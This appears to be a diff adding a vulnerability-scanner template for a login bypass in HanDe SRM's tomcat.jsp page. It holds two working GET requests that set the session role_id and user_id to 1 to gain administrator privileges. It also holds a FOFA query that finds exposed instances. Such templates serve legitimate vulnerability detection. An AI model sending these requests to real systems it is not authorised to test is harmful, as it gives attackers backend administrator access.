@@ -1,0 +1,34 @@
+id: hand-srm-auth-bypass
+
+info:
+  name: Hand SRM - Path Bypass
+  author: Co5mos
+  severity: high
+  description: There is a login bypass vulnerability in the HanDe SRM tomcat.jsp file, where attackers can gain backend administrator privileges by sending request packets.
+  reference:
+    - https://peiqi.wgpsec.org/wiki/webapp/%E6%B1%89%E5%BE%97/%E6%B1%89%E5%BE%97SRM%20tomcat.jsp%20%E7%99%BB%E9%99%86%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.html
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: app="汉得SRM云平台"
+  tags: hand,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/tomcat.jsp?dataName=role_id&dataValue=1"
+      - "{{BaseURL}}/tomcat.jsp?dataName=user_id&dataValue=1"
+
+    stop-at-first-match: true    
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - Server Info.
+          - Session 列表
+        part: body
+        condition: and
